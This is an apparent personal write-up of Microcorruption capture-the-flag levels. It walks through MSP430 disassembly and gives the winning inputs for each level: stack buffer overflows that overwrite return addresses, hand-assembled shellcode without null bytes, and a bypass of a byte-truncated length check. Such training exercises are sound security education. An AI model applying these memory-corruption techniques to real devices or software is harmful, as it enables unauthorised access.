 ## Table of Contents
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [New Orleans](#new-orleans)
- [Sydney](#sydney)
- [Hanoi](#hanoi)
- [Cusco](#cusco)
- [Reykjavik](#reykjavik)
- [Whitehorse](#whitehorse)
- [Montevideo](#montevideo)
- [Johannesburg](#johannesburg)
- [Santa Cruz](#santa-cruz)
- [Jakarta](#jakarta)
- [Addis Ababa](#addis-ababa)

## Introduction

Welcome to my exploit write up on the embedded security challenges from the website [Microcorruption](https://microcorruption.com/). 

## New Orleans


Just looking through the disassembly you can see a fishy function right off the bat. We can see a function called create_password, which if we look at it we see it adding hex codes to memory address r15. If we convert those hexcodes to ascii we can see that it makes, NMTIhRY. If we enter that in as the password, we unlock the door, meaning we solved this challenge.

```asm
447e <create_password>
447e:  3f40 0024      mov	#0x2400, r15
4482:  ff40 4e00 0000 mov.b	#0x4e, 0x0(r15)
4488:  ff40 4d00 0100 mov.b	#0x4d, 0x1(r15)
448e:  ff40 5400 0200 mov.b	#0x54, 0x2(r15)
4494:  ff40 4900 0300 mov.b	#0x49, 0x3(r15)
449a:  ff40 6800 0400 mov.b	#0x68, 0x4(r15)
44a0:  ff40 5200 0500 mov.b	#0x52, 0x5(r15)
44a6:  ff40 5900 0600 mov.b	#0x59, 0x6(r15)
44ac:  cf43 0700      mov.b	#0x0, 0x7(r15)
44b0:  3041           ret
```

### Solved

Password = NMTIhRY

## Sydney


Looking at the disassembly this time there isn't any fishy functions like create_password. If we look at the check_password function this time we see that it is comparing hexcodes to the memory address location r15. If look at 
location 444a in the main function. We can see that the after getting the password the program puts the stack pointer into the r15 memory address. Which means the program is comparing the hexcodes to the password. If we enter in the hexcodes, 2d28462c5827735f, as the password the door fails to unlock. This doesn't mean our assumptions wrong, because if we swap the hexcode pairs 282d2c4627585f73, the door unlocks. The reason that worked is because of endianness swaps them during execution.

```asm
4438 <main>
4438:  3150 9cff      add	#0xff9c, sp
443c:  3f40 b444      mov	#0x44b4 "Enter the password to continue.", r15
4440:  b012 6645      call	#0x4566 <puts>
4444:  0f41           mov	sp, r15
4446:  b012 8044      call	#0x4480 <get_password>
444a:  0f41           mov	sp, r15
444c:  b012 8a44      call	#0x448a <check_password>
4450:  0f93           tst	r15
4452:  0520           jnz	#0x445e <main+0x26>
4454:  3f40 d444      mov	#0x44d4 "Invalid password; try again.", r15
4458:  b012 6645      call	#0x4566 <puts>
445c:  093c           jmp	#0x4470 <main+0x38>
445e:  3f40 f144      mov	#0x44f1 "Access Granted!", r15
4462:  b012 6645      call	#0x4566 <puts>
4466:  3012 7f00      push	#0x7f
446a:  b012 0245      call	#0x4502 <INT>
446e:  2153           incd	sp
4470:  0f43           clr	r15
4472:  3150 6400      add	#0x64, sp

448a <check_password>
448a:  bf90 282d 0000 cmp	#0x2d28, 0x0(r15)
4490:  0d20           jnz	$+0x1c
4492:  bf90 2c46 0200 cmp	#0x462c, 0x2(r15)
4498:  0920           jnz	$+0x14
449a:  bf90 2758 0400 cmp	#0x5827, 0x4(r15)
44a0:  0520           jne	#0x44ac <check_password+0x22>
44a2:  1e43           mov	#0x1, r14
44a4:  bf90 5f73 0600 cmp	#0x735f, 0x6(r15)
44aa:  0124           jeq	#0x44ae <check_password+0x24>
44ac:  0e43           clr	r14
44ae:  0f4e           mov	r14, r15
44b0:  3041           ret
```

### Solved

Password = 282d2c4627585f73

## Hanoi


If we run the program we get the message that passwords can only be as big as 16 characters. We can test that restraint by entering a ton of As as the password. If we look at the login function and put a breakpoint at location 455a. We can see that the program is looking for hexcode cb at the memory location 2410. If we look at that memory location we can see that we are overwrote that location with As. So, let's see if adding hexcode cb to that location will unlock the door. If we pad the password with 16 hexcode 41s, then add the hexcode cb at the end. We can see that this password unlocks the door solving the challenge.

```asm
4520 <login>
4520:  c243 1024      mov.b	#0x0, &0x2410
4524:  3f40 7e44      mov	#0x447e "Enter the password to continue.", r15
4528:  b012 de45      call	#0x45de <puts>
452c:  3f40 9e44      mov	#0x449e "Remember: passwords are between 8 and 16 characters.", r15
4530:  b012 de45      call	#0x45de <puts>
4534:  3e40 1c00      mov	#0x1c, r14
4538:  3f40 0024      mov	#0x2400, r15
453c:  b012 ce45      call	#0x45ce <getsn>
4540:  3f40 0024      mov	#0x2400, r15
4544:  b012 5444      call	#0x4454 <test_password_valid>
4548:  0f93           tst	r15
454a:  0324           jz	$+0x8
454c:  f240 3000 1024 mov.b	#0x30, &0x2410
4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
4556:  b012 de45      call	#0x45de <puts>
455a:  f290 cb00 1024 cmp.b	#0xcb, &0x2410
4560:  0720           jne	#0x4570 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
456e:  3041           ret
4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
4574:  b012 de45      call	#0x45de <puts>
4578:  3041           ret



2400:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
2410:   4141 4141 4141 4141 4141 4141 0000 0000   AAAAAAAAAAAA....
2420:   0000 0000 0000 0000 0000 0000 0000 0000   ................
```

### Solved

Password = 41414141414141414141414141414141cb

## Cusco


When we put in a password longer than 16 characters we get this message, "insn address unaligned", in the debugger console. Normally the message is "CPUOFF flag set; program no longer running. CPU must now be reset". This means we are possible overwritting the instruction pointer. If we use the password, ABCDEFGHIJKLMNOPQRSTUVWXYZ, and put a breakpoint on the return call in the login function. If we step once we see that in the instruction pointer is 5251 or RQ. That means we are overwriting the pointer. If we add the location of the unlock_door function, 4446, in place RQ in our password, we can get the program to go there and unlock the door for us. Converting the everything to hex and swapping the unlock_door function's location for endianness solves this challenge.

### Solved

Password = 414243444546474849505152535455564644

## Reykjavik


For this challenge the functions being ran are encrypted at. To figure this out we can get all the current instructions that are ran after a password is entered in. Once we have how the password is checked we can see that it is only compared to if the hexcode of the password equals 0x29cf. That is all we have to enter in to unlock the door.

```asm
pop sr
ret
add #0x6, sp
cmp #0x29cf, -0x24(r4)
jnz $+0xc
add #0x20, sp
pop r4
pop r11
ret
clr r15
bis #0xf0, sr
jmp $-0x4
```

### Solved

password = cf29

## Whitehorse


If we enter a password greater than 16 characters we get the error "insn address unaligned" again meaning we are overwriting the instruction pointer. Unlike the level, Hanoi, there is no function we can call to unlock the door. This means we need to make our own function that unlocks the door. How we will do this is be looking in the manual for the different types of interrupts. The 0x7f interrupt will unlock the door for us, and it doesn't require any arguments to do so. Now we can use the assembly tool to assemble our function and get it's shell code, 30127f00b0123245. Next we will enter the alphabet and see where we overwrite the instruction pointer at. The instruction pointer this time has 5251 or RQ in it. This means the instruction pointer is overwritten after exactly 16 characters. Now we need to tell it where to point to which the stack where the user entered password is, is a great place because our shellcode will be there. Looking at the memory dump window we see that the user entered password is located at 3aae. Which means that needs to be after 16 characters in the password. The shellcode we have only takes up 8 characters, so we need 8 more to pad the password with. Entering the our created password solves the challenge.

```asm
push #0x7f
call #0x4532


3a90:   0000 0000 0000 0000 0000 0000 4645 0100   ............FE..
3aa0:   4645 0300 ba45 0000 0a00 0000 2a45 4142   FE...E......*EAB
3ab0:   4344 4546 4748 494a 4b4c 4d4e 4f50 5152   CDEFGHIJKLMNOPQR
3ac0:   5354 5556 5758 595a 0000 0000 0000 0000   STUVWXYZ........
```

### Solved

password = 30127f00b01232454141414141414141ae3a

## Montevideo


Just like the last level we are getting the error, "insn address unaligned", when we enter a password greater than 16 characters. We need to make our own function that unlocks the door again. This time though the shellcode has to contains no 0x00 hexcode, this is because of the strcpy function. Strcpy copies the user password from it's location on the stack to where the stack pointer is. It will stop copying if there is a 0x00 hexcode, so we need to avoid using any. This time we need to add a whole word to the stack, but the interrupt is only one byte. So we need to use a and opcode to get set it to 0x7f using only words. We can then call the interrupt when 0x7f is on the stack, unlocking the door. Now we can use the assembly tool to assemble our function and get it's shell code, 34507f2234f0ff110412b0124c45. Next we will enter the alphabet and see where we overwrite the instruction pointer at. The instruction pointer this time has 5251 or RQ in it. This means the instruction pointer is overwritten after exactly 16 characters. Now we need to tell it where to point to which the stack where the user entered password is, is a great place because our shellcode will be there. Looking at the memory dump window we see that the user entered password is located at 43ee. Which means that needs to be after 16 characters in the password. The shellcode we have only takes up 14 characters, so we need 2 more to pad the password with. Entering the our created password solves the challenge.

```asm
add #0x227f, r4
and #0x11ff, r4
push r4
call #0x454c


43e0:   6045 0300 d445 0000 0a00 0000 4445 4142   `E...E......DEAB
43f0:   4344 4546 4748 494a 4b4c 4f4d 4e4f 5051   CDEFGHIJKLOMNOPQ
4400:   5253 5455 5657 5859 5a00 35d0 085a 3f40   RSTUVWXYZ.5..Z?@
```

### Solved

password = 34507f2234f0ff110412b0124c454141ee43

## Johannesburg


Unlike the last couple of challenges this program is checking if the user input is greater than 16. The only problem is at line 4578 in the login function. There it is checking for the hexcode 0x52 17 addresses from the stack pointer, which at the time is pointing at the location of the user input password. This means all we need to do is have hex 52 after 17 characters in the password. If we enter a password with a size greater than 16 characters and at the 18th character is 0x52, then we add the hexcode of the alphabet we get the error "insn address unaligned". In the instruction pointer is 4241 or BA, which means all we need to do is add the location of the unlock_door function, 4446, after the 0x52 in our password. Entering this as the password unlocks the door.

```asm
452c <login>
452c:  3150 eeff      add	#0xffee, sp
4530:  f140 5200 1100 mov.b	#0x52, 0x11(sp)
4536:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
453a:  b012 f845      call	#0x45f8 <puts>
453e:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4542:  b012 f845      call	#0x45f8 <puts>
4546:  3e40 3f00      mov	#0x3f, r14
454a:  3f40 0024      mov	#0x2400, r15
454e:  b012 e845      call	#0x45e8 <getsn>
4552:  3e40 0024      mov	#0x2400, r14
4556:  0f41           mov	sp, r15
4558:  b012 2446      call	#0x4624 <strcpy>
455c:  0f41           mov	sp, r15
455e:  b012 5244      call	#0x4452 <test_password_valid>
4562:  0f93           tst	r15
4564:  0524           jz	#0x4570 <login+0x44>
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
456e:  023c           jmp	#0x4574 <login+0x48>
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 5200 1100 cmp.b	#0x52, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```

### Solved

password = 4141414141414141414141414141414141524644

## Santa Cruz

This challenge we have both a username and password this time. If start the program it states that both should be less than 16 characters. So, to start off if we enter should enter 20 "A"s as the username and password. The first problem is the cmp op code on 4600 in the login function. Once the code reaches there it exits, while printing "Invalid Password Length: password too short.". If we set a breakpoint there we can see that r11 and r15 are being compared with each other. r11 has hex 14 in it and r15 has hex 41. We can see that whatever was suppose to be in r15 was overwritten with an A and r11 is 20 decimal or the size of the inputs we entered. If we check the next line jumps to the exit code, if r15 is greater than r11. So, since we know that we can overwrite the value what if we enter a smaller number there. If we see on line 45fa, r15 is 19 hex minus r4, which is 43cc, which equals 43b3. If we look at the memory dump that location is where our inputs are stored and it is 17 characters from the start. So we need 17 characters than a small number in the username.

```asm
pc  4600  sp  43a0  sr  0005  cg  0000
r04 43cc  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0014
r12 0000  r13 43c9  r14 43c9  r15 0041

4390:   0000 d846 0300 4c47 0000 0a00 0000 d045   ...F..LG.......E
43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
43b0:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
43c0:   4141 4141 4141 4141 4141 0000 4044 0000   AAAAAAAAAA..@D..
```

This time we enter 41414141414141414141414141414141410141 as the username and 20 "A"s again as the password. This time when we at the compare at line 4600 we pass it and continue on with the code. The problem this time is line, 4650. At this line the code jumps to an exit if this is not a 0 at the memory location 6 hex minus r4, or 43cc, which equals 43c6. At that memory location is an A or hex 41 not a 0. What we can do is shorten the password so there is a 0 there.

```asm
pc  45ea  sp  43a0  sr  0001  cg  0000
r04 43cc  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0014
r12 0000  r13 43c9  r14 43c9  r15 0001

4390:   0000 d846 0300 4c47 0000 0a00 1400 4c46   ...F..LG......LF
43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
43b0:   4141 4101 4141 4141 4141 4141 4141 4141   AAA.AAAAAAAAAAAA
43c0:   4141 4141 4141 4141 4100 0000 4044 0000   AAAAAAAAA...@D..
```

So this time we enter 41414141414141414141414141414141410141 as the username and 16 "A"s again as the password. We pass the compares and reach the return code this time. We can now see that the return address is stored at 43cc, which is somewhere we can overwrite it. The problem is we need a 0 at the memory location 43c6. If we think about how the function strcpy works it adds a null byte at the end of the string it is copying. So if we make the username long enough to overwrite the return address to the unlock_door address, 444a. We can have the password small enough to, so when it gets copied it replaces whatever is at 43c6 with a 0. Creating this username and password solves the challenge.

```asm
pc  4666  sp  43cc  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 43c4  r14 0000  r15 0000

4390:   0000 d846 0300 4c47 0000 0a00 0f00 4c46   ...F..LG......LF
43a0:   0000 4141 4141 4141 4141 4141 4141 4141   ..AAAAAAAAAAAAAA
43b0:   4141 4101 4141 4141 4141 4141 4141 4141   AAA.AAAAAAAAAAAA
43c0:   4141 4141 0000 0000 0000 0000 4044 0000   AAAA........@D..
```

```asm
444a <unlock_door>
444a:  3012 7f00      push	#0x7f
444e:  b012 c446      call	#0x46c4 <INT>
4452:  2153           incd	sp
4454:  3041           ret


4550 <login>
4550:  0b12           push	r11
4552:  0412           push	r4
4554:  0441           mov	sp, r4
4556:  2452           add	#0x4, r4
4558:  3150 d8ff      add	#0xffd8, sp
455c:  c443 faff      mov.b	#0x0, -0x6(r4)
4560:  f442 e7ff      mov.b	#0x8, -0x19(r4)
4564:  f440 1000 e8ff mov.b	#0x10, -0x18(r4)
456a:  3f40 8444      mov	#0x4484 "Authentication now requires a username and password.", r15
456e:  b012 2847      call	#0x4728 <puts>
4572:  3f40 b944      mov	#0x44b9 "Remember: both are between 8 and 16 characters.", r15
4576:  b012 2847      call	#0x4728 <puts>
457a:  3f40 e944      mov	#0x44e9 "Please enter your username:", r15
457e:  b012 2847      call	#0x4728 <puts>
4582:  3e40 6300      mov	#0x63, r14
4586:  3f40 0424      mov	#0x2404, r15
458a:  b012 1847      call	#0x4718 <getsn>
458e:  3f40 0424      mov	#0x2404, r15
4592:  b012 2847      call	#0x4728 <puts>
4596:  3e40 0424      mov	#0x2404, r14
459a:  0f44           mov	r4, r15
459c:  3f50 d6ff      add	#0xffd6, r15
45a0:  b012 5447      call	#0x4754 <strcpy>
45a4:  3f40 0545      mov	#0x4505 "Please enter your password:", r15
45a8:  b012 2847      call	#0x4728 <puts>
45ac:  3e40 6300      mov	#0x63, r14
45b0:  3f40 0424      mov	#0x2404, r15
45b4:  b012 1847      call	#0x4718 <getsn>
45b8:  3f40 0424      mov	#0x2404, r15
45bc:  b012 2847      call	#0x4728 <puts>
45c0:  0b44           mov	r4, r11
45c2:  3b50 e9ff      add	#0xffe9, r11
45c6:  3e40 0424      mov	#0x2404, r14
45ca:  0f4b           mov	r11, r15
45cc:  b012 5447      call	#0x4754 <strcpy>
45d0:  0f4b           mov	r11, r15
45d2:  0e44           mov	r4, r14
45d4:  3e50 e8ff      add	#0xffe8, r14
45d8:  1e53           inc	r14
45da:  ce93 0000      tst.b	0x0(r14)
45de:  fc23           jnz	#0x45d8 <login+0x88>
45e0:  0b4e           mov	r14, r11
45e2:  0b8f           sub	r15, r11
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11
45ec:  0628           jnc	#0x45fa <login+0xaa>
45ee:  1f42 0024      mov	&0x2400, r15
45f2:  b012 2847      call	#0x4728 <puts>
45f6:  3040 4044      br	#0x4440 <__stop_progExec__>
45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
45fe:  8f11           sxt	r15
4600:  0b9f           cmp	r15, r11
4602:  062c           jc	#0x4610 <login+0xc0>
4604:  1f42 0224      mov	&0x2402, r15
4608:  b012 2847      call	#0x4728 <puts>
460c:  3040 4044      br	#0x4440 <__stop_progExec__>
4610:  c443 d4ff      mov.b	#0x0, -0x2c(r4)
4614:  3f40 d4ff      mov	#0xffd4, r15
4618:  0f54           add	r4, r15
461a:  0f12           push	r15
461c:  0f44           mov	r4, r15
461e:  3f50 e9ff      add	#0xffe9, r15
4622:  0f12           push	r15
4624:  3f50 edff      add	#0xffed, r15
4628:  0f12           push	r15
462a:  3012 7d00      push	#0x7d
462e:  b012 c446      call	#0x46c4 <INT>
4632:  3152           add	#0x8, sp
4634:  c493 d4ff      tst.b	-0x2c(r4)
4638:  0524           jz	#0x4644 <login+0xf4>
463a:  b012 4a44      call	#0x444a <unlock_door>
463e:  3f40 2145      mov	#0x4521 "Access granted.", r15
4642:  023c           jmp	#0x4648 <login+0xf8>
4644:  3f40 3145      mov	#0x4531 "That password is not correct.", r15
4648:  b012 2847      call	#0x4728 <puts>
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	#0x465e <login+0x10e>
4652:  1f42 0024      mov	&0x2400, r15
4656:  b012 2847      call	#0x4728 <puts>
465a:  3040 4044      br	#0x4440 <__stop_progExec__>
465e:  3150 2800      add	#0x28, sp
4662:  3441           pop	r4
4664:  3b41           pop	r11
4666:  3041           ret
```

### Solved

username = 4141414141414141414141414141414141014141414141414141414141414141414141414141414141414a44
password = 4141414141414141414141414141414141

## Jakarta


Like the last challenge this one also requires a username and password. If we enter a password that is greater that 32 characters the program exits without allowing us to enter a password. The program prints this when exiting "Invalid Password Length: password too long.", which is weird, because we enter a long username not password. So, next time running the program we enter 32 "A"s as the username. This time we get the password prompt. If we enter another 32 "A"s, we exit the program and get the message "Invalid Password Length: password too long.". If we look at line 4600, this is where the program is making the compare to see if the username and password combo is too long. We can see that it is looking for less than 21 hex or 33 characters in both the username and password, which there combined character amount is stored in r15. If we look back at how r15 is calculated, the start of the user input for the password, is put into r15 and then r15 get added by 1 till there is a 0 at the location that's in r15. Then the start location of the password is subtracted from r15. This gets the amount of characters entered in, then that is added with the previous number gotten from the username character amount. r15 is then checked to see if it less than 21 hex, which as we can see it is 40 hex, so the program will exit. But, cmp.b only compares the last byte, so if the password character amount is greater than 100 hex, or 256, and is less than 121 hex, or 289.

```asm
pc  4600  sp  3ff2  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0020
r12 0000  r13 4032  r14 2422  r15 0040
```

If we enter the 32 "A"s as the username and 256 "A"s as the password, so this time we can pass all the user input size checks. This time we reached the return code. If we see the return code was saved at memory location 4016. But, that has been overwritten by our user input. If we look we overwrite the password after 36 character. So, all we need to do is, after 4 "A"s in the password input we put 4c44 or the location of the unlock_door function. Doing this solves the challenge.

```asm
pc  4634  sp  4016  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 4141
r12 0000  r13 4112  r14 0000  r15 0000

3fe0:   7846 0100 7846 0300 ec46 0000 0a00 2000   xF..xF...F.... .
3ff0:   2e46 4141 4141 4141 4141 4141 4141 4141   .FAAAAAAAAAAAAAA
4000:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
4010:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
4020:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
4030:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
```

```asm
444c <unlock_door>
444c:  3012 7f00      push	#0x7f
4450:  b012 6446      call	#0x4664 <INT>
4454:  2153           incd	sp
4456:  3041           ret


4560 <login>
4560:  0b12           push	r11
4562:  3150 deff      add	#0xffde, sp
4566:  3f40 8244      mov	#0x4482 "Authentication requires a username and password.", r15
456a:  b012 c846      call	#0x46c8 <puts>
456e:  3f40 b344      mov	#0x44b3 "Your username and password together may be no more than 32 characters.", r15
4572:  b012 c846      call	#0x46c8 <puts>
4576:  3f40 fa44      mov	#0x44fa "Please enter your username:", r15
457a:  b012 c846      call	#0x46c8 <puts>
457e:  3e40 ff00      mov	#0xff, r14
4582:  3f40 0224      mov	#0x2402, r15
4586:  b012 b846      call	#0x46b8 <getsn>
458a:  3f40 0224      mov	#0x2402, r15
458e:  b012 c846      call	#0x46c8 <puts>
4592:  3f40 0124      mov	#0x2401, r15
4596:  1f53           inc	r15
4598:  cf93 0000      tst.b	0x0(r15)
459c:  fc23           jnz	#0x4596 <login+0x36>
459e:  0b4f           mov	r15, r11
45a0:  3b80 0224      sub	#0x2402, r11
45a4:  3e40 0224      mov	#0x2402, r14
45a8:  0f41           mov	sp, r15
45aa:  b012 f446      call	#0x46f4 <strcpy>
45ae:  7b90 2100      cmp.b	#0x21, r11
45b2:  0628           jnc	#0x45c0 <login+0x60>
45b4:  1f42 0024      mov	&0x2400, r15
45b8:  b012 c846      call	#0x46c8 <puts>
45bc:  3040 4244      br	#0x4442 <__stop_progExec__>
45c0:  3f40 1645      mov	#0x4516 "Please enter your password:", r15
45c4:  b012 c846      call	#0x46c8 <puts>
45c8:  3e40 1f00      mov	#0x1f, r14
45cc:  0e8b           sub	r11, r14
45ce:  3ef0 ff01      and	#0x1ff, r14
45d2:  3f40 0224      mov	#0x2402, r15
45d6:  b012 b846      call	#0x46b8 <getsn>
45da:  3f40 0224      mov	#0x2402, r15
45de:  b012 c846      call	#0x46c8 <puts>
45e2:  3e40 0224      mov	#0x2402, r14
45e6:  0f41           mov	sp, r15
45e8:  0f5b           add	r11, r15
45ea:  b012 f446      call	#0x46f4 <strcpy>
45ee:  3f40 0124      mov	#0x2401, r15
45f2:  1f53           inc	r15
45f4:  cf93 0000      tst.b	0x0(r15)
45f8:  fc23           jnz	#0x45f2 <login+0x92>
45fa:  3f80 0224      sub	#0x2402, r15
45fe:  0f5b           add	r11, r15
4600:  7f90 2100      cmp.b	#0x21, r15
4604:  0628           jnc	#0x4612 <login+0xb2>
4606:  1f42 0024      mov	&0x2400, r15
460a:  b012 c846      call	#0x46c8 <puts>
460e:  3040 4244      br	#0x4442 <__stop_progExec__>
4612:  0f41           mov	sp, r15
4614:  b012 5844      call	#0x4458 <test_username_and_password_valid>
4618:  0f93           tst	r15
461a:  0524           jz	#0x4626 <login+0xc6>
461c:  b012 4c44      call	#0x444c <unlock_door>
4620:  3f40 3245      mov	#0x4532 "Access granted.", r15
4624:  023c           jmp	#0x462a <login+0xca>
4626:  3f40 4245      mov	#0x4542 "That password is not correct.", r15
462a:  b012 c846      call	#0x46c8 <puts>
462e:  3150 2200      add	#0x22, sp
4632:  3b41           pop	r11
4634:  3041           ret
```

### Solved

username = 4141414141414141414141414141414141414141414141414141414141414141
password = 414141414c4441414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141
